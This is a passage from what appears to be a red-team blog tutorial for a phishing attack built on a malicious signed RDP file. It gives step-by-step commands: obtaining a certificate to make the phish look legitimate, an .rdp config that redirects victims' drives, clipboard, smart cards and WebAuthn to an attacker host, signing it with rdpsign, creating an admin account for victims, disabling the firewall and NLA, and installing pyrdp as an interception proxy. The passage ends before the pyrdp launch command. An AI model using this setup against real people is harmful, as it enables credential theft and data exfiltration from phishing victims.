#D8DEE9FF">version </span><span style="color: #B48EAD">1</span></span></code></pre></div>



<p>now that the WSL installation has finished, click <strong><em>SHIFT+RIGHT CLICK</em></strong> anywhere on desktop and click on <strong><em>Open Linux Shell Here</em></strong>:</p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="436" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-open-wsl-1024x436.png" alt="" class="wp-image-449" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-open-wsl-1024x436.png 1024w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-open-wsl-300x128.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-open-wsl-768x327.png 768w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-open-wsl.png 1375w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>In the WSL shell we will need to install python3, certbot and git:</p>



<div class="wp-block-kevinbatdorf-code-block-pro cbp-hl-loaded cbp-ff-loaded" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:4;tab-size:var(--cbp-tab-width, 2)"><span style="display:flex;align-items:center;padding:10px 0px 10px 16px;margin-bottom:-2px;width:100%;text-align:left;background-color:#39404f;color:#c8d0e0">Bash WSL</span><span role="button" tabindex="0" data-code="apt update
apt install python3 python3-pip git libaugeas0
pip install certbot" style="color: rgb(216, 222, 233); display: block;" aria-label="Copy" class="code-block-pro-copy-button cbp-cb-loaded"><svg xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path class="with-check" stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5"></path><path class="without-check" stroke-linecap="round" stroke-linejoin="round" d="M16.5 8.25V6a2.25 2.25 0 00-2.25-2.25H6A2.25 2.25 0 003.75 6v8.25A2.25 2.25 0 006 16.5h2.25m8.25-8.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-7.5A2.25 2.25 0 018.25 18v-1.5m8.25-8.25h-6a2.25 2.25 0 00-2.25 2.25v6"></path></svg></span><pre class="shiki nord" style="background-color: #2e3440ff" tabindex="0"><code><span class="line"><span style="color: #88C0D0">apt</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">update</span></span>
<span class="line"><span style="color: #88C0D0">apt</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">install</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">python3</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">python3-pip</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">git</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">libaugeas0</span></span>
<span class="line"><span style="color: #88C0D0">pip</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">install</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">certbot</span></span></code></pre></div>



<p></p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="532" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-wsl-install-dependencies-1024x532.png" alt="" class="wp-image-450" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-wsl-install-dependencies-1024x532.png 1024w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-wsl-install-dependencies-300x156.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-wsl-install-dependencies-768x399.png 768w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-wsl-install-dependencies.png 1078w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Now let’s setup our dns records and get an ssl certificate for it.<br>Get yourself a domain name and simply create an A record and point it to your EC2 instance:</p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="582" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-set-dns-a-record-1024x582.png" alt="" class="wp-image-452" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-set-dns-a-record-1024x582.png 1024w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-set-dns-a-record-300x170.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-set-dns-a-record-768x436.png 768w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-set-dns-a-record.png 1081w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Now we can user certbot to get a Let’s Encrypt SSL certificate for our domain – we will use it to sign our final RDP file and gain a little bit more legitimacy for our phish.</p>



<p>Note: Make sure to have you security group on AWS allow inbound http (port 80) from the internet (that’s how certbot will confirm you own your domain) and also turn off your windows firewall on the EC2 instance:</p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="761" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-turn-off-firewall-1024x761.png" alt="" class="wp-image-453" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-turn-off-firewall-1024x761.png 1024w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-turn-off-firewall-300x223.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-turn-off-firewall-768x571.png 768w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-ec2-turn-off-firewall.png 1307w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Now run the following command in the WSL shell to get your certificate from Certbot:</p>



<div class="wp-block-kevinbatdorf-code-block-pro cbp-hl-loaded cbp-ff-loaded" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:4;tab-size:var(--cbp-tab-width, 2)"><span style="display:flex;align-items:center;padding:10px 0px 10px 16px;margin-bottom:-2px;width:100%;text-align:left;background-color:#39404f;color:#c8d0e0">Bash WSL</span><span role="button" tabindex="0" data-code="certbot certonly --cert-name malrdp -d <your.domain.com> --register-unsafely-without-email" style="color: rgb(216, 222, 233); display: block;" aria-label="Copy" class="code-block-pro-copy-button cbp-cb-loaded"><svg xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path class="with-check" stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5"></path><path class="without-check" stroke-linecap="round" stroke-linejoin="round" d="M16.5 8.25V6a2.25 2.25 0 00-2.25-2.25H6A2.25 2.25 0 003.75 6v8.25A2.25 2.25 0 006 16.5h2.25m8.25-8.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-7.5A2.25 2.25 0 018.25 18v-1.5m8.25-8.25h-6a2.25 2.25 0 00-2.25 2.25v6"></path></svg></span><pre class="shiki nord" style="background-color: #2e3440ff" tabindex="0"><code><span class="line"><span style="color: #88C0D0">certbot</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">certonly</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">--cert-name</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">malrdp</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-d</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">&lt;</span><span style="color: #A3BE8C">your.domain.co</span><span style="color: #D8DEE9FF">m</span><span style="color: #81A1C1">&gt;</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">--register-unsafely-without-email</span></span></code></pre></div>



<p></p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="571" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-certbot-request-certificate-1024x571.png" alt="" class="wp-image-454" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-certbot-request-certificate-1024x571.png 1024w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-certbot-request-certificate-300x167.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-certbot-request-certificate-768x428.png 768w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-certbot-request-certificate.png 1080w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Your private key and public key will be saved in the WSL filesystem at /etc/letsencrypt/live/YOUR_CERT_NAME/. Now let’s convert those into a pfx format using openssl</p>



<div class="wp-block-kevinbatdorf-code-block-pro cbp-hl-loaded cbp-ff-loaded" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:4;tab-size:var(--cbp-tab-width, 2)"><span style="display:flex;align-items:center;padding:10px 0px 10px 16px;margin-bottom:-2px;width:100%;text-align:left;background-color:#39404f;color:#c8d0e0">Bash WSL</span><span role="button" tabindex="0" data-code="openssl pkcs12 -inkey /etc/letsencrypt/live/malrdp/privkey.pem -in /etc/letsencrypt/live/malrdp/fullchain.pem -export -out malrdp.pfx" style="color: rgb(216, 222, 233); display: block;" aria-label="Copy" class="code-block-pro-copy-button cbp-cb-loaded"><svg xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path class="with-check" stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5"></path><path class="without-check" stroke-linecap="round" stroke-linejoin="round" d="M16.5 8.25V6a2.25 2.25 0 00-2.25-2.25H6A2.25 2.25 0 003.75 6v8.25A2.25 2.25 0 006 16.5h2.25m8.25-8.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-7.5A2.25 2.25 0 018.25 18v-1.5m8.25-8.25h-6a2.25 2.25 0 00-2.25 2.25v6"></path></svg></span><pre class="shiki nord" style="background-color: #2e3440ff" tabindex="0"><code><span class="line"><span style="color: #88C0D0">openssl</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">pkcs12</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-inkey</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/etc/letsencrypt/live/malrdp/privkey.pem</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-in</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/etc/letsencrypt/live/malrdp/fullchain.pem</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-export</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-out</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">malrdp.pfx</span></span></code></pre></div>



<p></p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="576" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-openssl-create-pfx-1024x576.png" alt="" class="wp-image-455" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-openssl-create-pfx-1024x576.png 1024w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-openssl-create-pfx-300x169.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-openssl-create-pfx-768x432.png 768w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-openssl-create-pfx.png 1108w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Next step is to install this certificate in our Windows Cert Store, you can do this by right clicking on the pfx file and clicking on <strong>Install PFX</strong> and follow the instructions in the wizard.</p>



<p>Now that we have installed our certificate we need to obtain its thumbprint so we could use it to sign our RDP file (our phish) which we will create in a second. To obtain our certificate thumbprint we can use <strong><em>certmgr.msc -&gt; Personal -&gt; Certificates -&gt; DOUBLE CLICK ON OUR CERTIFICATE -&gt; Details -&gt; Thumbprint</em></strong>. Copy your certificate’s thumbprint as we will need it for the next step.</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="1025" height="836" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-get-cert-thumbprint.png" alt="" class="wp-image-457" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-get-cert-thumbprint.png 1025w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-get-cert-thumbprint-300x245.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-get-cert-thumbprint-768x626.png 768w" sizes="(max-width: 1025px) 100vw, 1025px"></figure>



<p>Now we are ready to create our RDP file that will serve as our phish. Open notepad and create new file called <strong><em>malrdp.rdp</em></strong>, copy the following into it, make sure to change the domain name in the <strong><em>full address</em></strong> field but leave the port as 443, and save the RDP file:</p>



<div class="wp-block-kevinbatdorf-code-block-pro cbp-hl-loaded cbp-ff-loaded" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2;tab-size:var(--cbp-tab-width, 2)"><span style="display:flex;align-items:center;padding:10px 0px 10px 16px;margin-bottom:-2px;width:100%;text-align:left;background-color:#39404f;color:#c8d0e0">Plaintext</span><span role="button" tabindex="0" data-code="screen mode id:i:1
use multimon:i:0
desktopwidth:i:1920
desktopheight:i:1080
session bpp:i:32
winposstr:s:0,1,1904,23,3840,1142
compression:i:1
keyboardhook:i:2
audiocapturemode:i:0
videoplaybackmode:i:1
connection type:i:7
networkautodetect:i:1
bandwidthautodetect:i:1
displayconnectionbar:i:1
enableworkspacereconnect:i:0
disable wallpaper:i:0
allow font smoothing:i:0
allow desktop composition:i:0
disable full window drag:i:1
disable menu anims:i:1
disable themes:i:0
disable cursor setting:i:0
bitmapcachepersistenable:i:1
full address:s:<YOUR.DOMAIN.COM>:443
audiomode:i:0
redirectprinters:i:1
redirectcomports:i:0
redirectsmartcards:i:1
redirectwebauthn:i:1
redirectclipboard:i:1
redirectposdevices:i:0
autoreconnection enabled:i:1
authentication level:i:2
prompt for credentials:i:0
negotiate security layer:i:1
remoteapplicationmode:i:0
alternate shell:s:
shell working directory:s:
gatewayhostname:s:
gatewayusagemethod:i:4
gatewaycredentialssource:i:4
gatewayprofileusagemethod:i:0
promptcredentialonce:i:0
gatewaybrokeringtype:i:0
use redirection server name:i:0
rdgiskdcproxy:i:0
kdcproxyname:s:
enablerdsaadauth:i:0
redirectlocation:i:0
drivestoredirect:s:*" style="color: rgb(216, 222, 233); display: block;" aria-label="Copy" class="code-block-pro-copy-button cbp-cb-loaded"><svg xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path class="with-check" stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5"></path><path class="without-check" stroke-linecap="round" stroke-linejoin="round" d="M16.5 8.25V6a2.25 2.25 0 00-2.25-2.25H6A2.25 2.25 0 003.75 6v8.25A2.25 2.25 0 006 16.5h2.25m8.25-8.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-7.5A2.25 2.25 0 018.25 18v-1.5m8.25-8.25h-6a2.25 2.25 0 00-2.25 2.25v6"></path></svg></span><pre class="shiki nord" style="background-color: #2e3440ff" tabindex="0"><code><span class="line"><span style="color: #d8dee9ff">screen mode id:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">use multimon:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">desktopwidth:i:1920</span></span>
<span class="line"><span style="color: #d8dee9ff">desktopheight:i:1080</span></span>
<span class="line"><span style="color: #d8dee9ff">session bpp:i:32</span></span>
<span class="line"><span style="color: #d8dee9ff">winposstr:s:0,1,1904,23,3840,1142</span></span>
<span class="line"><span style="color: #d8dee9ff">compression:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">keyboardhook:i:2</span></span>
<span class="line"><span style="color: #d8dee9ff">audiocapturemode:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">videoplaybackmode:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">connection type:i:7</span></span>
<span class="line"><span style="color: #d8dee9ff">networkautodetect:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">bandwidthautodetect:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">displayconnectionbar:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">enableworkspacereconnect:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">disable wallpaper:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">allow font smoothing:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">allow desktop composition:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">disable full window drag:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">disable menu anims:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">disable themes:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">disable cursor setting:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">bitmapcachepersistenable:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">full address:s:&lt;YOUR.DOMAIN.COM&gt;:443</span></span>
<span class="line"><span style="color: #d8dee9ff">audiomode:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">redirectprinters:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">redirectcomports:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">redirectsmartcards:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">redirectwebauthn:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">redirectclipboard:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">redirectposdevices:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">autoreconnection enabled:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">authentication level:i:2</span></span>
<span class="line"><span style="color: #d8dee9ff">prompt for credentials:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">negotiate security layer:i:1</span></span>
<span class="line"><span style="color: #d8dee9ff">remoteapplicationmode:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">alternate shell:s:</span></span>
<span class="line"><span style="color: #d8dee9ff">shell working directory:s:</span></span>
<span class="line"><span style="color: #d8dee9ff">gatewayhostname:s:</span></span>
<span class="line"><span style="color: #d8dee9ff">gatewayusagemethod:i:4</span></span>
<span class="line"><span style="color: #d8dee9ff">gatewaycredentialssource:i:4</span></span>
<span class="line"><span style="color: #d8dee9ff">gatewayprofileusagemethod:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">promptcredentialonce:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">gatewaybrokeringtype:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">use redirection server name:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">rdgiskdcproxy:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">kdcproxyname:s:</span></span>
<span class="line"><span style="color: #d8dee9ff">enablerdsaadauth:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">redirectlocation:i:0</span></span>
<span class="line"><span style="color: #d8dee9ff">drivestoredirect:s:*</span></span></code></pre></div>



<p></p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="728" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-create-rdp-file-1024x728.png" alt="" class="wp-image-456" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-create-rdp-file-1024x728.png 1024w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-create-rdp-file-300x213.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-create-rdp-file-768x546.png 768w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-create-rdp-file.png 1483w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Now let’s sign this RDP file. In PowerShell, enter the following command to sign your RDP file:</p>



<div class="wp-block-kevinbatdorf-code-block-pro cbp-hl-loaded cbp-ff-loaded" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:4;tab-size:var(--cbp-tab-width, 2)"><span style="display:flex;align-items:center;padding:10px 0px 10px 16px;margin-bottom:-2px;width:100%;text-align:left;background-color:#39404f;color:#c8d0e0">PowerShell</span><span role="button" tabindex="0" data-code="rdpsign.exe /sha256 YOUR_CERTIFICATE_THUMBPRINT .\malrdp.rdp" style="color: rgb(216, 222, 233); display: block;" aria-label="Copy" class="code-block-pro-copy-button cbp-cb-loaded"><svg xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path class="with-check" stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5"></path><path class="without-check" stroke-linecap="round" stroke-linejoin="round" d="M16.5 8.25V6a2.25 2.25 0 00-2.25-2.25H6A2.25 2.25 0 003.75 6v8.25A2.25 2.25 0 006 16.5h2.25m8.25-8.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-7.5A2.25 2.25 0 018.25 18v-1.5m8.25-8.25h-6a2.25 2.25 0 00-2.25 2.25v6"></path></svg></span><pre class="shiki nord" style="background-color: #2e3440ff" tabindex="0"><code><span class="line"><span style="color: #88C0D0">rdpsign.exe</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">/</span><span style="color: #D8DEE9FF">sha256 YOUR_CERTIFICATE_THUMBPRINT .\malrdp.rdp</span></span></code></pre></div>



<p></p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="511" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-sign-rdp-file-1024x511.png" alt="" class="wp-image-458" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-sign-rdp-file-1024x511.png 1024w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-sign-rdp-file-300x150.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-sign-rdp-file-768x383.png 768w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-sign-rdp-file.png 1290w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>If you would open your RDP file now you would see that it is indeed signed:</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="715" height="334" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-sign-rdp-file-success.png" alt="" class="wp-image-459" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-sign-rdp-file-success.png 715w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-sign-rdp-file-success-300x140.png 300w" sizes="(max-width: 715px) 100vw, 715px"></figure>



<p>Now that’s that is out of the way let’s create a new user for our victims to connect to:</p>



<div class="wp-block-kevinbatdorf-code-block-pro cbp-hl-loaded cbp-ff-loaded" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:4;tab-size:var(--cbp-tab-width, 2)"><span style="display:flex;align-items:center;padding:10px 0px 10px 16px;margin-bottom:-2px;width:100%;text-align:left;background-color:#39404f;color:#c8d0e0">PowerShell</span><span role="button" tabindex="0" data-code="net user tsuser StrongP@ssw0rd /add
net localgroup administrators tsuser /add" style="color: rgb(216, 222, 233); display: block;" aria-label="Copy" class="code-block-pro-copy-button cbp-cb-loaded"><svg xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path class="with-check" stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5"></path><path class="without-check" stroke-linecap="round" stroke-linejoin="round" d="M16.5 8.25V6a2.25 2.25 0 00-2.25-2.25H6A2.25 2.25 0 003.75 6v8.25A2.25 2.25 0 006 16.5h2.25m8.25-8.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-7.5A2.25 2.25 0 018.25 18v-1.5m8.25-8.25h-6a2.25 2.25 0 00-2.25 2.25v6"></path></svg></span><pre class="shiki nord" style="background-color: #2e3440ff" tabindex="0"><code><span class="line"><span style="color: #D8DEE9FF">net user tsuser StrongP</span><span style="color: #81A1C1">@</span><span style="color: #D8DEE9">ssw0rd</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">/</span><span style="color: #D8DEE9FF">add</span></span>
<span class="line"><span style="color: #D8DEE9FF">net localgroup administrators tsuser </span><span style="color: #81A1C1">/</span><span style="color: #D8DEE9FF">add</span></span></code></pre></div>



<p></p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="895" height="304" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-add-tsuser.png" alt="" class="wp-image-460" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-add-tsuser.png 895w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-add-tsuser-300x102.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-add-tsuser-768x261.png 768w" sizes="(max-width: 895px) 100vw, 895px"></figure>



<p>In order to have the RDP file connect automatically without the need for the victim to type in the user and the password we will use <a rel="noreferrer noopener" href="https://github.com/GoSecure/pyrdp.git" target="_blank"><strong><em>pyrdp</em></strong></a> to serve as the proxy for the RDP and also for the automatic login. Open the WSL shell again and download and install <a rel="noreferrer noopener" href="https://github.com/GoSecure/pyrdp.git" data-type="URL" data-id="https://github.com/GoSecure/pyrdp.git" target="_blank"><strong><em>pyrdp</em></strong></a> using the following commands:</p>



<div class="wp-block-kevinbatdorf-code-block-pro cbp-hl-loaded cbp-ff-loaded" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:4;tab-size:var(--cbp-tab-width, 2)"><span style="display:flex;align-items:center;padding:10px 0px 10px 16px;margin-bottom:-2px;width:100%;text-align:left;background-color:#39404f;color:#c8d0e0">Bash WSL</span><span role="button" tabindex="0" data-code="cd /opt/
git clone https://github.com/GoSecure/pyrdp.git
cd pyrdp/
pip install ." style="color: rgb(216, 222, 233); display: block;" aria-label="Copy" class="code-block-pro-copy-button cbp-cb-loaded"><svg xmlns="http://www.w3.org/2000/svg" style="width:24px;height:24px" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path class="with-check" stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5"></path><path class="without-check" stroke-linecap="round" stroke-linejoin="round" d="M16.5 8.25V6a2.25 2.25 0 00-2.25-2.25H6A2.25 2.25 0 003.75 6v8.25A2.25 2.25 0 006 16.5h2.25m8.25-8.25H18a2.25 2.25 0 012.25 2.25V18A2.25 2.25 0 0118 20.25h-7.5A2.25 2.25 0 018.25 18v-1.5m8.25-8.25h-6a2.25 2.25 0 00-2.25 2.25v6"></path></svg></span><pre class="shiki nord" style="background-color: #2e3440ff" tabindex="0"><code><span class="line"><span style="color: #88C0D0">cd</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/opt/</span></span>
<span class="line"><span style="color: #88C0D0">git</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">clone</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">https://github.com/GoSecure/pyrdp.git</span></span>
<span class="line"><span style="color: #88C0D0">cd</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">pyrdp/</span></span>
<span class="line"><span style="color: #88C0D0">pip</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">install</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">.</span></span></code></pre></div>



<p></p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1024" height="567" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-install-pyrdp-1024x567.png" alt="" class="wp-image-461" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-install-pyrdp-1024x567.png 1024w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-install-pyrdp-300x166.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-install-pyrdp-768x426.png 768w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-install-pyrdp.png 1128w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Before running pyrdp we have to make sure NLA is turned off for our Windows EC2. We can make sure by opening the <strong><em>Windows Settings -&gt; Remote Desktop -&gt; Advanced Settings -&gt; make sure to uncheck the Require computers to use Network Level Authentication to connect</em></strong>:</p>



<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="823" height="368" src="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-disable-nla.png" alt="" class="wp-image-462" srcset="https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-disable-nla.png 823w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-disable-nla-300x134.png 300w, https://shorsec.io/wp-content/uploads/2023/07/malrdp-post-disable-nla-768x343.png 768w" sizes="(max-width: 823px) 100vw, 823px"></figure>



<p>now we are ready to run pyrdp with the following command (make sure to use your certificate public and private keys so the victims won’t get any SSL warnings:</p>



